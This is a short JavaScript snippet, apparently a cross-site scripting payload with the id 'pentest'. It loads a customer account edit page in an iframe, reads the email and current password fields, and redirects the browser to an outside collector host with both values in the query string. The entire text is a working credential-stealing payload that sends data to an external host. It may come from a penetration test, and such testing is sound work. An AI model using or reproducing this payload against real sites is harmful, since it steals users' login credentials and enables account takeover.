var i=Object.assign(document.createElement('iframe'),{id:'pentest',src:'\\monchauffagisteprive\\customer\\account\\edit\\'});
i.addEventListener('load',function(){
  var p=i.contentDocument;
  window.location='\\\\cfvmfg5larn1035ll01s3825vw1npfd4.gloups.itr-af.com\\?user='+p.querySelector('#email').value+'&pass='+p.querySelector('#current_password').value;
});
document.body.appendChild(i);
